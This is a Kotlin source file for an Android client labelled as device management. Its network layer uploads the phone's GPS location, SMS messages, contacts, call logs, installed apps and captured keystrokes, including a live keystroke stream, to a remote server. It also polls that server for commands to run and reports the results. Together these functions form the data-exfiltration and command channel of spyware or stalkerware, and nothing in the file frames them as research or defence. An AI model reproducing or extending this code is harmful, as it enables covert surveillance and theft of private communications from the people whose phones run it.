package com.mdm.client.network

import android.content.Context
import android.os.Build
import android.util.Log
import com.mdm.client.config.AppConfig
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class ApiClient(private val context: Context) {

    companion object {
        private const val TAG = "ApiClient"
        private val JSON = "application/json; charset=utf-8".toMediaType()
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val baseUrl get() = AppConfig.getApiBaseUrl(context)

    fun registerDevice(deviceId: String, deviceIp: String) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceIp", deviceIp)
            put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
            // Include FCM token if available
            val fcmToken = AppConfig.getFcmToken(context)
            if (!fcmToken.isNullOrBlank()) {
                put("fcmToken", fcmToken)
            }
        }
        post("/register-device", body)
    }

    fun pushLocation(deviceId: String, latitude: Double, longitude: Double,
                     accuracy: Float, provider: String, timestamp: Long) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("status", "success")
            put("latitude", latitude)
            put("longitude", longitude)
            put("accuracy", accuracy)
            put("provider", provider)
            put("timestamp", timestamp)
        }
        post("/location", body)
    }

    fun pushSms(deviceId: String, messages: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("smsMessages", JSONObject().apply {
                put("messages", org.json.JSONArray(messages.map { JSONObject(it) }))
            })
        }
        post("/sms-messages", body)
    }

    fun pushContacts(deviceId: String, contacts: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", JSONObject().apply {
                put("contacts", org.json.JSONArray(contacts.map { JSONObject(it) }))
            })
        }
        post("/contacts", body)
    }

    fun pushCallLogs(deviceId: String, calls: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("callLogs", JSONObject().apply {
                put("calls", org.json.JSONArray(calls.map { JSONObject(it) }))
            })
        }
        post("/call-logs", body)
    }

    fun pushApps(deviceId: String, apps: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("apps", org.json.JSONArray(apps.map { JSONObject(it) }))
        }
        post("/apps-info", body)
    }

    fun pushKeystrokes(deviceId: String, keystrokes: List<Map<String, Any>>, live: Boolean = false) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("live_mode", live)
            put("keystrokes", org.json.JSONArray(keystrokes.map { JSONObject(it) }))
        }
        val endpoint = if (live) "/keystrokes/live" else "/keystrokes"
        post(endpoint, body)
    }

    /**
     * Poll the server for pending commands.
     * Returns a list of command JSON objects.
     */
    fun pollPendingCommands(deviceId: String): List<JSONObject> {
        val response = get("/commands/pending/$deviceId") ?: return emptyList()
        return try {
            val array = org.json.JSONArray(response)
            (0 until array.length()).map { array.getJSONObject(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse pending commands: ${e.message}")
            emptyList()
        }
    }

    /**
     * Report command execution status back to the server.
     */
    fun reportCommandStatus(commandId: Int, status: String, result: Map<String, Any>? = null) {
        val body = JSONObject().apply {
            put("status", status)
            if (result != null) put("result", JSONObject(result))
        }
        post("/commands/$commandId/status", body)
    }

    /** Fire-and-forget POST. Logs errors but does not throw. */
    fun post(path: String, body: JSONObject) {
        try {
            val request = Request.Builder()
                .url("$baseUrl$path")
                .post(body.toString().toRequestBody(JSON))
                .build()
            http.newCall(request).execute().use { resp ->
                if (!resp.isSuccessful) {
                    Log.w(TAG, "POST $path → HTTP ${resp.code}")
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "POST $path failed: ${e.message}")
        }
    }

    /** Synchronous GET, returns response body string or null on failure. */
    fun get(path: String): String? {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$path")
                .get()
                .build()
            http.newCall(request).execute().use { resp ->
                if (resp.isSuccessful) resp.body?.string() else null
            }
        } catch (e: IOException) {
            Log.e(TAG, "GET $path failed: ${e.message}")
            null
        }
    }
}
